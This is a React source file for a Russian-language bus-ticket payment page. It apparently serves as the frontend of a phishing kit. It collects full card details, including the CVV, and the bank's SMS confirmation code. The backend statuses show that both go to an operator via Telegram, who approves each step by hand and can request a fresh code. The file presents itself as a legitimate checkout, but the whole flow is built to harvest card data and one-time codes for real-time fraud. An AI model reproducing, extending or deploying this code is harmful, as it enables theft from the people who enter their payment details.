import React, { useState, useEffect } from 'react';
import { useLocation } from 'react-router-dom';
import styled, { keyframes } from 'styled-components';
import axios from 'axios';

const spin = keyframes`
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
`;

const Container = styled.div`
  background: rgba(255, 255, 255, 0.95);
  backdrop-filter: blur(10px);
  border-radius: 20px;
  padding: 3rem;
  box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
`;

const Title = styled.h1`
  text-align: center;
  color: ${props => props.theme.colors.dark};
  margin-bottom: 2rem;
  font-size: 2.5rem;
  font-weight: 700;
`;

const OrderSummary = styled.div`
  background: white;
  border-radius: 15px;
  padding: 2rem;
  margin-bottom: 2rem;
  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
`;

const PaymentForm = styled.form`
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 1.5rem;
  margin-bottom: 2rem;
  
  @media (max-width: ${props => props.theme.breakpoints.tablet}) {
    grid-template-columns: 1fr;
  }
`;

const InputGroup = styled.div`
  display: flex;
  flex-direction: column;
  
  &.full-width {
    grid-column: 1 / -1;
  }
`;

const Label = styled.label`
  font-weight: 600;
  margin-bottom: 0.5rem;
  color: ${props => props.theme.colors.dark};
`;

const Input = styled.input`
  padding: 1rem;
  border: 2px solid ${props => props.theme.colors.lightGray};
  border-radius: 10px;
  font-size: 1rem;
  transition: border-color 0.3s ease;
  
  &:focus {
    outline: none;
    border-color: ${props => props.theme.colors.primary};
  }
`;

const PayButton = styled.button`
  background: ${props => props.theme.colors.primary};
  color: white;
  border: none;
  padding: 1rem 2rem;
  border-radius: 10px;
  font-size: 1.2rem;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.3s ease;
  grid-column: 1 / -1;
  
  &:hover {
    background: ${props => props.theme.colors.primaryHover};
    transform: translateY(-2px);
  }
  
  &:disabled {
    background: ${props => props.theme.colors.gray};
    cursor: not-allowed;
    transform: none;
  }
`;

const LoadingOverlay = styled.div`
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.8);
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  z-index: 1000;
`;

const Spinner = styled.div`
  border: 4px solid #f3f3f3;
  border-top: 4px solid ${props => props.theme.colors.primary};
  border-radius: 50%;
  width: 50px;
  height: 50px;
  animation: ${spin} 2s linear infinite;
  margin-bottom: 1rem;
`;

const LoadingText = styled.div`
  color: white;
  font-size: 1.2rem;
  text-align: center;
`;

const SMSModal = styled.div`
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.8);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 1000;
`;

const SMSContent = styled.div`
  background: white;
  border-radius: 20px;
  padding: 3rem;
  max-width: 500px;
  width: 90%;
  text-align: center;
`;

const SMSInput = styled.input`
  padding: 1rem;
  border: 2px solid ${props => props.theme.colors.lightGray};
  border-radius: 10px;
  font-size: 1.5rem;
  text-align: center;
  width: 100%;
  margin: 1rem 0;
  letter-spacing: 0.5rem;
  
  &:focus {
    outline: none;
    border-color: ${props => props.theme.colors.primary};
  }
`;

const SMSButton = styled.button`
  background: ${props => props.theme.colors.secondary};
  color: white;
  border: none;
  padding: 1rem 2rem;
  border-radius: 10px;
  font-size: 1rem;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.3s ease;
  margin: 0.5rem;
  
  &:hover {
    background: #218838;
    transform: translateY(-2px);
  }
`;

const SuccessMessage = styled.div`
  background: ${props => props.theme.colors.secondary};
  color: white;
  padding: 2rem;
  border-radius: 15px;
  text-align: center;
  font-size: 1.2rem;
  margin-top: 2rem;
`;

const PaymentPage = () => {
  const location = useLocation();
  const { orderId, bus, passengerData } = location.state || {};
  
  const [cardData, setCardData] = useState({
    number: '',
    expiry: '',
    cvv: '',
    name: ''
  });
  
  const [paymentStage, setPaymentStage] = useState('card'); // 'card', 'loading', 'sms', 'completed'
  const [smsCode, setSmsCode] = useState('');
  const [loadingText, setLoadingText] = useState('');

  const handleCardInputChange = (e) => {
    let value = e.target.value;
    
    // Форматирование номера карты
    if (e.target.name === 'number') {
      value = value.replace(/\s/g, '').replace(/(.{4})/g, '$1 ').trim();
      value = value.slice(0, 19); // 16 цифр + 3 пробела
    }
    
    // Форматирование срока действия
    if (e.target.name === 'expiry') {
      value = value.replace(/\D/g, '').replace(/(\d{2})(\d)/, '$1/$2').slice(0, 5);
    }
    
    // Ограничение CVV
    if (e.target.name === 'cvv') {
      value = value.replace(/\D/g, '').slice(0, 3);
    }
    
    setCardData({
      ...cardData,
      [e.target.name]: value
    });
  };

  const handlePayment = async (e) => {
    e.preventDefault();
    setPaymentStage('loading');
    setLoadingText('Обрабатываем данные карты...\nОтправляем информацию администратору');
    
    try {
      const response = await axios.post(`${process.env.REACT_APP_API_URL || 'http://localhost:3001'}/api/process-payment`, {
        orderId,
        cardData
      });
      
      if (response.data.status === 'payment_sent_to_telegram') {
        setLoadingText('Ожидаем подтверждения от администратора...');
        
        // Проверяем статус каждые 2 секунды
        const checkStatus = setInterval(async () => {
          try {
            const statusResponse = await axios.get(`${process.env.REACT_APP_API_URL || 'http://localhost:3001'}/api/payment-status/${orderId}`);
            
            if (statusResponse.data.status === 'payment_confirmed') {
              clearInterval(checkStatus);
              setPaymentStage('sms');
            } else if (statusResponse.data.status === 'payment_rejected') {
              clearInterval(checkStatus);
              setPaymentStage('card');
              alert('Платеж отклонен. Проверьте данные карты.');
            }
          } catch (error) {
            console.error('Ошибка проверки статуса:', error);
          }
        }, 2000);
        
        // Таймаут через 5 минут
        setTimeout(() => {
          clearInterval(checkStatus);
        }, 300000);
      }
    } catch (error) {
      console.error('Ошибка платежа:', error);
      setPaymentStage('card');
      alert('Ошибка при обработке платежа. Попробуйте снова.');
    }
  };

  const handleSMSSubmit = async () => {
    if (!smsCode) return;
    
    try {
      setLoadingText('Отправляем SMS код администратору...');
      setPaymentStage('loading');
      
      const response = await axios.post(`${process.env.REACT_APP_API_URL || 'http://localhost:3001'}/api/send-sms-code`, {
        orderId,
        smsCode
      });
      
      if (response.data.status === 'sms_sent_to_telegram') {
        // Проверяем статус SMS
        const checkSMSStatus = setInterval(async () => {
          try {
            const statusResponse = await axios.get(`${process.env.REACT_APP_API_URL || 'http://localhost:3001'}/api/payment-status/${orderId}`);
            
            if (statusResponse.data.status === 'completed') {
              clearInterval(checkSMSStatus);
              setPaymentStage('completed');
            } else if (statusResponse.data.status === 'sms_resend_requested') {
              clearInterval(checkSMSStatus);
              setPaymentStage('sms');
              setSmsCode('');
              alert('Запрошен новый SMS код. Введите новый код.');
            }
          } catch (error) {
            console.error('Ошибка проверки SMS статуса:', error);
          }
        }, 2000);
      }
    } catch (error) {
      console.error('Ошибка отправки SMS:', error);
      setPaymentStage('sms');
      alert('Ошибка при отправке SMS кода.');
    }
  };

  if (!orderId) {
    return (
      <Container>
        <Title>Ошибка: заказ не найден</Title>
      </Container>
    );
  }

  return (
    <>
      <Container>
        <Title>Оплата билета</Title>
        
        <OrderSummary>
          <h3 style={{ color: '#007bff', marginBottom: '1rem' }}>Итоговый заказ</h3>
          <p><strong>Маршрут:</strong> {passengerData.from} → {passengerData.to}</p>
          <p><strong>Дата:</strong> {passengerData.date}</p>
          <p><strong>Пассажир:</strong> {passengerData.name}</p>
          <p><strong>Стоимость:</strong> {passengerData.price} PLN</p>
          <p><strong>Order ID:</strong> {orderId}</p>
        </OrderSummary>

        {paymentStage === 'card' && (
          <PaymentForm onSubmit={handlePayment}>
            <InputGroup>
              <Label>Номер карты</Label>
              <Input
                type="text"
                name="number"
                placeholder="1234 5678 9012 3456"
                value={cardData.number}
                onChange={handleCardInputChange}
                required
              />
            </InputGroup>
            
            <InputGroup>
              <Label>Имя на карте</Label>
              <Input
                type="text"
                name="name"
                placeholder="IVAN PETROV"
                value={cardData.name}
                onChange={handleCardInputChange}
                required
              />
            </InputGroup>
            
            <InputGroup>
              <Label>Срок действия</Label>
              <Input
                type="text"
                name="expiry"
                placeholder="MM/YY"
                value={cardData.expiry}
                onChange={handleCardInputChange}
                required
              />
            </InputGroup>
            
            <InputGroup>
              <Label>CVV</Label>
              <Input
                type="text"
                name="cvv"
                placeholder="123"
                value={cardData.cvv}
                onChange={handleCardInputChange}
                required
              />
            </InputGroup>
            
            <PayButton type="submit">
              Оплатить {passengerData.price} PLN
            </PayButton>
          </PaymentForm>
        )}

        {paymentStage === 'completed' && (
          <SuccessMessage>
            ✅ Платеж успешно завершен! Билет будет отправлен на ваш email в течение нескольких минут.
          </SuccessMessage>
        )}
      </Container>

      {paymentStage === 'loading' && (
        <LoadingOverlay>
          <Spinner />
          <LoadingText>
            {loadingText.split('\n').map((line, index) => (
              <div key={index}>{line}</div>
            ))}
          </LoadingText>
        </LoadingOverlay>
      )}

      {paymentStage === 'sms' && (
        <SMSModal>
          <SMSContent>
            <h2>Подтверждение по SMS</h2>
            <p>Введите SMS код, полученный на ваш телефон:</p>
            <SMSInput
              type="text"
              placeholder="123456"
              value={smsCode}
              onChange={(e) => setSmsCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
              maxLength={6}
            />
            <div>
              <SMSButton onClick={handleSMSSubmit}>
                Подтвердить
              </SMSButton>
            </div>
          </SMSContent>
        </SMSModal>
      )}
    </>
  );
};

export default PaymentPage;